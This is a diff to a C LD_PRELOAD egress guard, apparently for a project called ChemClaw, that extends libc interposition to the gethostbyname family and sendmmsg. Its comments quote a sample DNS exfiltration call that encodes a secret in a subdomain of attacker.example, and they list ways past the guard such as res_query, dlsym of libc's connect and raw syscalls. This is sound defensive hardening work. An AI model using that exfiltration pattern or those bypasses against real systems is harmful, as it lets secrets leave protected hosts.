@@ -1,7 +1,8 @@
 /*
- * The compiled half of the egress guard: interpose libc's `connect`, `getaddrinfo`, `sendto` and
- * `sendmsg` so a destination outside the derived allowlist is refused even when the caller is a
- * compiled extension that never touches Python's `socket` module.
+ * The compiled half of the egress guard: interpose libc's `connect`, `sendto`, `sendmsg`,
+ * `sendmmsg` and the whole public resolver family (`getaddrinfo`, `gethostbyname`,
+ * `gethostbyname2` and their `_r` forms) so a destination outside the derived allowlist is refused
+ * even when the caller is a compiled extension that never touches Python's `socket` module.
  *
  * WHY THIS FILE EXISTS, AND WHY IT IS C.
  *
@@ -27,8 +28,21 @@
  *
  *   - A **statically linked** binary, or one issuing the syscall directly (`syscall(SYS_connect)`,
  *     a Go binary, an `asm` stub). There is no dynamic symbol to interpose.
- *   - Anything not named below: `sendmmsg`, `io_uring`, a raw `AF_PACKET` socket, `write` on an
+ *   - Anything not named below: `io_uring`, a raw `AF_PACKET` socket, `write` on an
  *     already-connected descriptor this guard allowed.
+ *   - The **raw resolver API** — `res_query`, `res_search` and their `res_n*` kin. Measured on this
+ *     tree with the library armed and an allowlist of `127.0.0.1,localhost`, `res_query` returned a
+ *     61-byte answer for an off-allowlist name: they build the DNS packet themselves and send it on
+ *     a socket the resolver has `connect`ed to a nameserver, which is the one address the exemption
+ *     below permits. Named rather than chased, and the trade is stated: interposing them means
+ *     decoding a wire-format QNAME out of a caller-owned buffer to recover the string the caller
+ *     already held, for an API library code almost never reaches for. `gethostbyname` is the one
+ *     library code *does* reach for, which is why that family is interposed and this one is not.
+ *   - A **`dlopen`/`dlsym` of libc's own `connect`** from in-process native code: that resolves the
+ *     real symbol directly and this library is never on the path. Measured against a real gRPC
+ *     server over a non-loopback route — it connects, as `syscall(SYS_connect, …)` above does.
+ *     Both need native code already running in this process, which is the tier where this layer is
+ *     not the control and the NetworkPolicy is.
  *   - A process this interposer is not loaded into. It arms from `LD_PRELOAD` in
  *     `deploy/entrypoint.sh`, so every component of the image carries it; the knowledge-sync
  *     containers set their own `command` and deliberately do not (they are `git`, whose remote is
@@ -55,9 +69,26 @@
  * glibc's resolver `connect`s a UDP socket to the nameserver in `/etc/resolv.conf`, which is
  * non-loopback in every cluster — refusing it would break every lookup including the allowlisted
  * ones. So a dial to port 53 is permitted **only** when its address is one of the nameservers that
- * file names, read from the same file the resolver reads; a name that is not on the allowlist never
- * gets that far, because `getaddrinfo` refuses it first. That mirrors the chart, which already
+ * file names, read from the same file the resolver reads. That mirrors the chart, which already
  * carries DNS as its own rule rather than inside the destination-scoped one.
+ *
+ * **That exemption is a live exfiltration channel unless every resolver entry point is checked, and
+ * this file said otherwise.** The sentence here used to read "a name that is not on the allowlist
+ * never gets that far, because `getaddrinfo` refuses it first", which is true of `getaddrinfo` and
+ * of nothing else. Measured on one binary with the allowlist `127.0.0.1,localhost`: `getaddrinfo`
+ * was refused with `EAI_NONAME` and logged, while `gethostbyname`, `gethostbyname2`,
+ * `gethostbyname_r` and `gethostbyname2_r` all returned the real address with
+ * `chemclaw_netguard_preload_refused(RESOLVE)` flat and nothing written to stderr — so
+ * `gethostbyname("<base32-of-a-secret>.attacker.example")` reached an attacker's authoritative
+ * nameserver through the port-53 exemption, on a pod an operator reads as clean. It was also a
+ * disagreement with `netguard.py` in the wrong direction: the Python layer patches
+ * `socket.gethostbyname` precisely because that entry point matters, and the compiled layer, which
+ * exists to cover what Python cannot see, covered less. The whole family now takes the same
+ * `is_allowed_host` check, and a refusal is **byte-identical to a real NXDOMAIN** on this platform
+ * (`gethostbyname` → NULL with `h_errno = HOST_NOT_FOUND`; the `_r` forms → return 0, `*result`
+ * NULL, `*h_errnop = HOST_NOT_FOUND`, which is what glibc itself was measured doing for an
+ * unresolvable name — not a nonzero return, which is what guessing the contract would have
+ * produced).
  *
  * A **numeric** host passed to `getaddrinfo` is let through and judged at `connect` instead: no
  * query leaves the host for an IP literal, so charging it as a resolver refusal would misreport the
@@ -120,8 +151,15 @@ static unsigned long refused_resolve;
 static int (*real_connect)(int, const struct sockaddr *, socklen_t);
 static ssize_t (*real_sendto)(int, const void *, size_t, int, const struct sockaddr *, socklen_t);
 static ssize_t (*real_sendmsg)(int, const struct msghdr *, int);
+static int (*real_sendmmsg)(int, struct mmsghdr *, unsigned int, int);
 static int (*real_getaddrinfo)(const char *, const char *, const struct addrinfo *,
                                struct addrinfo **);
+static struct hostent *(*real_gethostbyname)(const char *);
+static struct hostent *(*real_gethostbyname2)(const char *, int);
+static int (*real_gethostbyname_r)(const char *, struct hostent *, char *, size_t,
+                                   struct hostent **, int *);
+static int (*real_gethostbyname2_r)(const char *, int, struct hostent *, char *, size_t,
+                                    struct hostent **, int *);
 
 /* ------------------------------------------------------------------ logging */
 
@@ -300,6 +338,73 @@ static int is_nameserver(const char *address)
     return 0;
 }
 
+/* ------------------------------------------------------------------ names
+
+ * One name check, reached by every resolver entry point. It used to live inline in `getaddrinfo`,
+ * which is how `gethostbyname` came to walk past it — a second hand-written copy would be the same
+ * defect one generation later, so there is one function and five callers. */
+
+/* An IP literal is not a name: no query leaves the host for it, so it is let through here and
+ * judged at `connect` instead. Charging it as a *resolver* refusal would misreport the event. */
+static int is_numeric_host(const char *node)
+{
+    char host[CHEMCLAW_HOST_MAX];
+    size_t length = strlen(node);
+    if (length >= sizeof host) {
+        return 0;
+    }
+    memcpy(host, node, length + 1);
+    unbracket(host);
+    struct in_addr v4;
+    struct in6_addr v6;
+    return inet_pton(AF_INET, host, &v4) == 1 || inet_pton(AF_INET6, host, &v6) == 1;
+}
+
+static int is_loopback_name(const char *node)
+{
+    return strcmp(node, "localhost") == 0 || strcmp(node, "localhost.") == 0;
+}
+
+/* 0 when `node` may be resolved, -1 when it is refused (refusal counted and logged). An empty or
+ * absent node is a caller asking for the local address and resolves nothing outward. */
+static int check_name(const char *node)
+{
+    if (node == NULL || node[0] == '\0') {
+        return 0;
+    }
+    if (is_numeric_host(node) || is_loopback_name(node) || is_allowed_host(node)) {
+        return 0;
+    }
+    __atomic_fetch_add(&refused_resolve, 1ul, __ATOMIC_SEQ_CST);
+    char message[512];
+    snprintf(message, sizeof message,
+             "refused resolve of %.180s - not the LLM gateway, declared infrastructure, or "
+             "a host named in CHEMCLAW_EGRESS_ALLOW",
+             node);
+    emit(message);
+    return -1;
+}
+
+/* Record what an **allowlisted name** resolved to, from a `hostent`. Same narrowing as the
+ * `getaddrinfo` path: a loopback address is already exempt by address and needs no entry, and a
+ * name that is not allowlisted never reaches here, so a second A record cannot become a standing
+ * permission for a host nobody declared. */
+static void remember_hostent(const struct hostent *entry)
+{
+    if (entry == NULL || entry->h_addr_list == NULL) {
+        return;
+    }
+    for (char **address = entry->h_addr_list; *address != NULL; address++) {
+        char text[INET6_ADDRSTRLEN];
+        if (inet_ntop(entry->h_addrtype, *address, text, sizeof text) == NULL) {
+            continue;
+        }
+        if (strncmp(text, "127.", 4) != 0 && strcmp(text, "::1") != 0) {
+            remember_resolved(text);
+        }
+    }
+}
+
 /* Render a socket address as (text, port, is_loopback). Returns 0 when the family carries no
  * destination that can leave this host — AF_UNIX is a path, and AF_UNSPEC on `connect` is the
  * idiom for un-connecting a datagram socket, which the resolver itself uses. */
@@ -412,35 +517,16 @@ int getaddrinfo(const char *node, const char *service, const struct addrinfo *hi
         real_getaddrinfo = (int (*)(const char *, const char *, const struct addrinfo *,
                                     struct addrinfo **))dlsym(RTLD_NEXT, "getaddrinfo");
     }
-    int numeric = 0;
-    if (node != NULL && node[0] != '\0') {
-        char host[CHEMCLAW_HOST_MAX];
-        size_t length = strlen(node);
-        if (length < sizeof host) {
-            memcpy(host, node, length + 1);
-            unbracket(host);
-            struct in_addr v4;
-            struct in6_addr v6;
-            numeric = inet_pton(AF_INET, host, &v4) == 1 || inet_pton(AF_INET6, host, &v6) == 1;
-        }
-        int loopback_name = strcmp(node, "localhost") == 0 || strcmp(node, "localhost.") == 0;
-        if (!numeric && !loopback_name && !is_allowed_host(node)) {
-            __atomic_fetch_add(&refused_resolve, 1ul, __ATOMIC_SEQ_CST);
-            char message[512];
-            snprintf(message, sizeof message,
-                     "refused resolve of %.180s - not the LLM gateway, declared infrastructure, or "
-                     "a host named in CHEMCLAW_EGRESS_ALLOW",
-                     node);
-            emit(message);
-            return EAI_NONAME;
-        }
+    if (check_name(node) != 0) {
+        return EAI_NONAME;
     }
     int status = real_getaddrinfo(node, service, hints, result);
     /* Record only what an **allowlisted name** resolved to. A loopback name is already exempt by
      * address, and a numeric host was never resolved at all — recording either would turn whatever
      * a second A record or a split-horizon resolver returns into a standing permission, which is
      * the narrowing `netguard.arm`'s own `getaddrinfo` hook already carries. */
-    if (status == 0 && result != NULL && node != NULL && !numeric && is_allowed_host(node)) {
+    if (status == 0 && result != NULL && node != NULL && !is_numeric_host(node)
+        && is_allowed_host(node)) {
         for (const struct addrinfo *entry = *result; entry != NULL; entry = entry->ai_next) {
             char text[INET6_ADDRSTRLEN];
             int port = 0;
@@ -451,6 +537,129 @@ int getaddrinfo(const char *node, const char *service, const struct addrinfo *hi
         }
     }
     return status;
+}
+
+/* The `gethostbyname` family, on the same check as `getaddrinfo` above.
+ *
+ * **Not a completeness exercise.** Measured before this existed: with the library armed and the
+ * allowlist `127.0.0.1,localhost`, `getaddrinfo("example.com")` was refused and logged while all
+ * four of these returned the real address in silence — so the port-53 exemption `check_address`
+ * grants the resolver was a live DNS exfiltration channel for any in-process caller that reached
+ * for the older API, which `netguard.py` patches and this layer did not.
+ *
+ * **The refusal is shaped like a real NXDOMAIN, because that is what glibc was measured doing**
+ * rather than what the manual page suggests: `gethostbyname` answers NULL with
+ * `h_errno = HOST_NOT_FOUND`, and the `_r` forms answer **0** with `*result = NULL` and
+ * `*h_errnop = HOST_NOT_FOUND` — a nonzero return is reserved for `ERANGE` and friends, so
+ * returning `HOST_NOT_FOUND` as the status would be a buffer-size error to every caller that reads
+ * the contract correctly.
+ *
+ * A `NULL` name is passed through untouched rather than refused: it is a caller error for these
+ * entry points, and the real function owns what that means. */
+struct hostent *gethostbyname(const char *name)
+{
+    if (real_gethostbyname == NULL) {
+        real_gethostbyname = (struct hostent * (*)(const char *))
+            dlsym(RTLD_NEXT, "gethostbyname");
+    }
+    if (check_name(name) != 0) {
+        h_errno = HOST_NOT_FOUND;
+        return NULL;
+    }
+    struct hostent *entry = real_gethostbyname(name);
+    if (entry != NULL && name != NULL && !is_numeric_host(name) && is_allowed_host(name)) {
+        remember_hostent(entry);
+    }
+    return entry;
+}
+
+struct hostent *gethostbyname2(const char *name, int family)
+{
+    if (real_gethostbyname2 == NULL) {
+        real_gethostbyname2 = (struct hostent * (*)(const char *, int))
+            dlsym(RTLD_NEXT, "gethostbyname2");
+    }
+    if (check_name(name) != 0) {
+        h_errno = HOST_NOT_FOUND;
+        return NULL;
+    }
+    struct hostent *entry = real_gethostbyname2(name, family);
+    if (entry != NULL && name != NULL && !is_numeric_host(name) && is_allowed_host(name)) {
+        remember_hostent(entry);
+    }
+    return entry;
+}
+
+int gethostbyname_r(const char *name, struct hostent *ret, char *buffer, size_t length,
+                    struct hostent **result, int *h_errnop)
+{
+    if (real_gethostbyname_r == NULL) {
+        real_gethostbyname_r = (int (*)(const char *, struct hostent *, char *, size_t,
+                                        struct hostent **, int *))
+            dlsym(RTLD_NEXT, "gethostbyname_r");
+    }
+    if (check_name(name) != 0) {
+        if (result != NULL) {
+            *result = NULL;
+        }
+        if (h_errnop != NULL) {
+            *h_errnop = HOST_NOT_FOUND;
+        }
+        return 0;
+    }
+    int status = real_gethostbyname_r(name, ret, buffer, length, result, h_errnop);
+    if (status == 0 && result != NULL && name != NULL && !is_numeric_host(name)
+        && is_allowed_host(name)) {
+        remember_hostent(*result);
+    }
+    return status;
+}
+
+int gethostbyname2_r(const char *name, int family, struct hostent *ret, char *buffer, size_t length,
+                     struct hostent **result, int *h_errnop)
+{
+    if (real_gethostbyname2_r == NULL) {
+        real_gethostbyname2_r = (int (*)(const char *, int, struct hostent *, char *, size_t,
+                                         struct hostent **, int *))
+            dlsym(RTLD_NEXT, "gethostbyname2_r");
+    }
+    if (check_name(name) != 0) {
+        if (result != NULL) {
+            *result = NULL;
+        }
+        if (h_errnop != NULL) {
+            *h_errnop = HOST_NOT_FOUND;
+        }
+        return 0;
+    }
+    int status = real_gethostbyname2_r(name, family, ret, buffer, length, result, h_errnop);
+    if (status == 0 && result != NULL && name != NULL && !is_numeric_host(name)
+        && is_allowed_host(name)) {
+        remember_hostent(*result);
+    }
+    return status;
+}
+
+/* `sendmmsg` is `sendmsg`'s batching form and carries a destination per message, so one refused
+ * address in a batch refuses the whole call — a partial send that silently dropped the refused
+ * entries would report success for a batch this layer did not permit. It was on the conceded list
+ * above until it was measured connecting; six lines is cheaper than the concession. */
+int sendmmsg(int fd, struct mmsghdr *messages, unsigned int count, int flags)
+{
+    if (real_sendmmsg == NULL) {
+        real_sendmmsg = (int (*)(int, struct mmsghdr *, unsigned int, int))
+            dlsym(RTLD_NEXT, "sendmmsg");
+    }
+    if (messages != NULL) {
+        for (unsigned int i = 0; i < count; i++) {
+            const struct msghdr *header = &messages[i].msg_hdr;
+            if (header->msg_name != NULL
+                && check_address((const struct sockaddr *)header->msg_name, "sendmmsg") != 0) {
+                return -1;
+            }
+        }
+    }
+    return real_sendmmsg(fd, messages, count, flags);
 }
 
 /* ------------------------------------------------------------ what Python reads */
